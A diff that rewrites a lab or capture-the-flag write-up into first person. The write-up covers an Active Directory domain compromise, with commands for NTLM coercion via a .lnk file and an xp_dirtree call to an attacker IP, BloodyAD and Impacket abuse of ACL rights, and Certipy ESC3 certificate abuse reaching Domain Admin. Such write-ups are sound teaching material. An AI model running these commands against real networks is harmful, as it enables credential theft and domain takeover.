@@ -54,7 +54,7 @@ PORT      STATE SERVICE       REASON          VERSION
 - Two non-standard web-facing services stand out: IIS on port **80** and Microsoft SQL Server on port **1433**.
 - The domain is `shadowgate.local`.
 
-SMB share enumeration without valid credentials was not permitted, and anonymous RPC enumeration did not yield user lists.
+I attempted SMB share enumeration without valid credentials, but it was not permitted, and anonymous RPC enumeration did not yield user lists.
 
 ![](nxc-smb-enum.png)
 
@@ -82,11 +82,11 @@ Ryan James
 
 ![](website-account-names.png)
 
-These names were used to generate candidate username lists in various AD naming formats, but Kerbrute did not validate any of them.
+I used these names to generate candidate username lists in various AD naming formats, but Kerbrute did not validate any of them.
 
 ![](username-format-fail.png)
 
-Since directory brute-forcing with **Gobuster** returned nothing, attention turned to virtual host discovery, which revealed a subdomain.
+Since directory brute-forcing with **Gobuster** returned nothing, I turned to virtual host discovery, which revealed a subdomain.
 
 ![](subdomain-discovery.png)
 
@@ -98,7 +98,7 @@ The discovered subdomain `dev.shadowgate.local` hosted a developer portal. At th
 
 ![](naming-format-reveal.png)
 
-Using this new naming format, a fresh wordlist was generated and tested with **Kerbrute**, which confirmed five valid usernames.
+Using this new naming format, I generated a fresh wordlist and tested it with **Kerbrute**, which confirmed five valid usernames.
 
 ```
 2026/08/07 10:52:04 >  [+] VALID USERNAME:       milo.w@shadowgate.local
@@ -111,23 +111,23 @@ Using this new naming format, a fresh wordlist was generated and tested with **K
 
 ![](valid-usernames.png)
 
-None of the accounts were found to be ASREProastable (pre-authentication not disabled).
+I found that none of the accounts were ASREProastable (pre-authentication not disabled).
 
 ![](asrep-test.png)
 
 ### The Upload Portal
 
-A directory brute-force with **Feroxbuster** on `dev.shadowgate.local` surfaced an interesting endpoint, `upload.aspx`.
+I ran a directory brute-force with **Feroxbuster** on `dev.shadowgate.local`, which surfaced an interesting endpoint, `upload.aspx`.
 
 ![](feroxbuster-upload-aspx.png)
 
-Visiting the page granted access to the `mitch.r` account without requiring authentication, completely bypassing the login page. The page also revealed the location where uploaded files are stored and processed — a `dev` folder that doubles as an SMB share.
+Visiting the page, I gained access to the `mitch.r` account without requiring authentication, completely bypassing the login page. The page also revealed the location where uploaded files are stored and processed — a `dev` folder that doubles as an SMB share.
 
 ![](upload-portal-access.png)
 
 ## Step 3: Initial Access
 
-Since the upload portal runs in the context of `mitch.r` and the processed files are stored in an SMB share we have write access to, a `.lnk` file was crafted to trigger an SMB connection back to the attacker when the file is accessed. **Responder** was started to listen for the connection.
+Since the upload portal runs in the context of `mitch.r` and the processed files are stored in an SMB share I have write access to, I crafted a `.lnk` file to trigger an SMB connection back to me when the file is accessed. I started **Responder** to listen for the connection.
 
 ```
 sudo responder -dvw -I tun0
@@ -141,7 +141,7 @@ Uploading the file:
 
 ![](lnk-upload.png)
 
-After hitting issues with the first tool, a modified variant was used to craft the payload.
+After hitting issues with the first tool, I used a modified variant to craft the payload.
 
 ![](lnk-tool-modification.png)
 
@@ -149,23 +149,23 @@ The uploaded file triggered an SMB authentication attempt, and Responder capture
 
 ![](ntlm-captured.png)
 
-The captured hash was successfully cracked offline, revealing the plaintext password for `mitch.r`.
+I successfully cracked the captured hash offline, revealing the plaintext password for `mitch.r`.
 
 ![](hash-cracked.png)
 
 ### SMB Share Enumeration
 
-With valid credentials, the SMB shares were enumerated.
+With valid credentials, I enumerated the SMB shares.
 
 ![](smb-shares-authenticated.png)
 
-Nothing interesting was found inside the share itself.
+I found nothing interesting inside the share itself.
 
 ![](share-content.png)
 
 ### BloodHound Collection
 
-A domain-wide collection was performed to map out attack paths.
+I performed a domain-wide collection to map out attack paths.
 
 ```
 bloodyAD --host SG-DC01 -d shadowgate.local -u 'mitch.r' -p '<REDACTED>' get bloodhound
@@ -177,7 +177,7 @@ BloodHound revealed that `mitch.r` has **ForceChangePassword** outbound object c
 
 ## Step 4: Privilege Escalation — Taking Over the MSSQL Service Account
 
-The ForceChangePassword primitive was abused with **BloodyAD** to reset the passwords of both controlled users.
+I abused the ForceChangePassword primitive with **BloodyAD** to reset the passwords of both controlled users.
 
 ```
 bloodyAD --host <dc> -d <domain> -u <user> -p <pass> set password <target_user> '<newpassword>'
@@ -187,13 +187,13 @@ bloodyAD --host <dc> -d <domain> -u <user> -p <pass> set password <target_user> 
 
 ![](password-change-2.png)
 
-BloodHound showed that `milo.w` has outbound object control over the `svc_mssql` account, so this user became the focus since `ryan.j` was a dead end.
+BloodHound showed that `milo.w` has outbound object control over the `svc_mssql` account, so I made this user the focus since `ryan.j` was a dead end.
 
 ![](milo-object-control.png)
 
 ![](milo-target.png)
 
-First, ownership of the `svc_mssql` account was taken using the `WriteOwner` primitive.
+First, I took ownership of the `svc_mssql` account using the `WriteOwner` primitive.
 
 ```
 impacket-owneredit -action write -new-owner 'milo.w' -target 'svc_mssql' 'shadowgate.local/milo.w:<REDACTED>' -dc-ip 10.1.44.124
@@ -201,7 +201,7 @@ impacket-owneredit -action write -new-owner 'milo.w' -target 'svc_mssql' 'shadow
 
 ![](take-ownership.png)
 
-Then full control was granted to `milo.w` via a DACL write.
+Then I granted full control to `milo.w` via a DACL write.
 
 ```
 impacket-dacledit -action write -rights FullControl -principal 'milo.w' -target 'svc_mssql' 'shadowgate.local/milo.w:<REDACTED>' -dc-ip 10.1.44.124
@@ -209,7 +209,7 @@ impacket-dacledit -action write -rights FullControl -principal 'milo.w' -target 
 
 ![](dacl-full-control.png)
 
-With full control over the account, its password was reset.
+With full control over the account, I reset its password.
 
 ```
 bloodyAD --host 10.1.44.124 -d shadowgate.local -u milo.w -p '<REDACTED>' set password 'svc_mssql' '<REDACTED>'
@@ -219,7 +219,7 @@ bloodyAD --host 10.1.44.124 -d shadowgate.local -u milo.w -p '<REDACTED>' set pa
 
 ## Step 5: Lateral Movement via MSSQL
 
-The new `svc_mssql` credentials were tested and confirmed working.
+I tested the new `svc_mssql` credentials and confirmed they work.
 
 ![](svc-mssql-verify.png)
 
@@ -260,11 +260,11 @@ EXEC xp_dirtree '\\10.200.77.181\share'
 
 ![](xp-dirtree.png)
 
-The hash of the MSSQL service account (running as `bogdan.r`) was captured.
+I captured the hash of the MSSQL service account (running as `bogdan.r`).
 
 ![](ntlmv2-captured.png)
 
-The captured hash was cracked, yielding the plaintext password for `bogdan.r`.
+I cracked the captured hash, yielding the plaintext password for `bogdan.r`.
 
 ![](bogdan-hash-cracked.png)
 
@@ -272,7 +272,7 @@ BloodHound showed that `bogdan.r` has **GenericAll** over two users.
 
 ![](bogdan-genericall.png)
 
-This was abused to reset the passwords of both users.
+I abused this to reset the passwords of both users.
 
 ![](password-reset-users.png)
 
@@ -284,11 +284,11 @@ This was abused to reset the passwords of both users.
 
 ![](oscar-remote-access.png)
 
-Attempting to authenticate revealed that the account has logon-hours restrictions in place.
+I attempted to authenticate, which revealed that the account has logon-hours restrictions in place.
 
 ![](logon-hours-restriction.png)
 
-Since we control the account, the logon hours were cleared using **BloodyAD**.
+Since I control the account, I cleared the logon hours using **BloodyAD**.
 
 ```
 bloodyAD --host 10.1.44.124 -d shadowgate.local -u bogdan.r -p '<REDACTED>' set object oscar.m logonHours
@@ -296,7 +296,7 @@ bloodyAD --host 10.1.44.124 -d shadowgate.local -u bogdan.r -p '<REDACTED>' set 
 
 ![](bypass-logon-hours.png)
 
-Authentication now succeeded, and the user flag was captured.
+Authentication now succeeded, and I captured the user flag.
 
 ![](logon-success.png)
 
@@ -304,7 +304,7 @@ Authentication now succeeded, and the user flag was captured.
 
 ## Step 6: ADCS Attack — ESC3 to Domain Admin
 
-While enumerating the website, a note mentioned an employee who had left the company whose role was *certificate manager & enrollment agent*. This hinted at an ADCS attack.
+While enumerating the website, I noticed a note mentioning an employee who had left the company whose role was *certificate manager & enrollment agent*. This hinted at an ADCS attack.
 
 ![](certificate-manager-note.png)
 
@@ -316,7 +316,7 @@ A termination email confirmed this assumption.
 
 ![](termination-email.png)
 
-Deleted user objects were queried from the Active Directory recycle bin.
+I queried deleted user objects from the Active Directory recycle bin.
 
 ```
 Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties * | fl name,lastKnownParent,DeletedTime
@@ -324,7 +324,7 @@ Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeD
 
 ![](deleted-objects-query.png)
 
-The deleted `sam.h` account was restored from the recycle bin using **BloodyAD**.
+I restored the deleted `sam.h` account from the recycle bin using **BloodyAD**.
 
 ```
 bloodyAD -u oscar.m -p '<REDACTED>' -d shadowgate.local -H 10.1.44.124 set restore "sam.h"
@@ -332,7 +332,7 @@ bloodyAD -u oscar.m -p '<REDACTED>' -d shadowgate.local -H 10.1.44.124 set resto
 
 ![](restore-account.png)
 
-Its password was then reset.
+I then reset its password.
 
 ```
 bloodyAD -u oscar.m -p '<REDACTED>' -d shadowgate.local --host 10.1.44.124 set password "sam.h" '<REDACTED>'
@@ -346,7 +346,7 @@ Confirming the account is active again.
 
 ### Certificate Enumeration
 
-**Certipy** was used to enumerate the CA for vulnerable templates.
+I used **Certipy** to enumerate the CA for vulnerable templates.
 
 ```
 certipy-ad find -u sam.h@shadowgate.local -p '<REDACTED>' -dc-ip 10.1.44.124 -vulnerable -ldap-scheme ldap -vulnerable -stdout
@@ -360,7 +360,7 @@ The output revealed the certificate authority is vulnerable to **ESC3** and **ES
 
 ### ESC3 Exploitation
 
-ESC3 (Enrollment Agent) allows a certificate on the `Shadowgate-EnrollmentAgent` template to be requested, then used to request certificates **on behalf of** other principals. Because the termination email stated a specific endpoint must be used, the certificate was requested using the `-dynamic-endpoint` flag.
+ESC3 (Enrollment Agent) allows a certificate on the `Shadowgate-EnrollmentAgent` template to be requested, then used to request certificates **on behalf of** other principals. Because the termination email stated a specific endpoint must be used, I requested the certificate using the `-dynamic-endpoint` flag.
 
 ```
 certipy req -u 'sam.h@shadowgate.local' -p '<REDACTED>' -dc-ip 10.1.44.124 -ca 'Shadowgate-CA' -target SG-DC01.shadowgate.local -template 'Shadowgate-EnrollmentAgent' -dynamic-endpoint
@@ -372,7 +372,7 @@ This produced a valid Enrollment Agent certificate for `sam.h`.
 
 ![](enrollment-agent-cert.png)
 
-With a valid Enrollment Agent certificate, a certificate was requested **on behalf of** the `Administrator` against the `User` template.
+With a valid Enrollment Agent certificate, I requested a certificate **on behalf of** the `Administrator` against the `User` template.
 
 ```
 certipy req -u 'sam.h@shadowgate.local' -p '<REDACTED>' -dc-ip 10.1.44.124 -ca 'ShadowGate-CA' -target SG-DC01.shadowgate.local -template User -on-behalf-of 'shadowgate\administrator' -pfx sam.h.pfx
@@ -380,7 +380,7 @@ certipy req -u 'sam.h@shadowgate.local' -p '<REDACTED>' -dc-ip 10.1.44.124 -ca '
 
 ![](on-behalf-admin.png)
 
-Authenticating with the Administrator certificate dumped the NTLM hash of the Domain Admin.
+Authenticating with the Administrator certificate, I dumped the NTLM hash of the Domain Admin.
 
 ```
 certipy auth -pfx 'administrator.pfx' -dc-ip 10.1.44.124
@@ -388,7 +388,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip 10.1.44.124
 
 ![](admin-cert-auth.png)
 
-With the Domain Admin hash, authentication as `administrator` succeeded and the final flag was captured, completing the domain compromise.
+With the Domain Admin hash, I authenticated as `administrator` and captured the final flag, completing the domain compromise.
 
 ![](admin-shell.png)
 
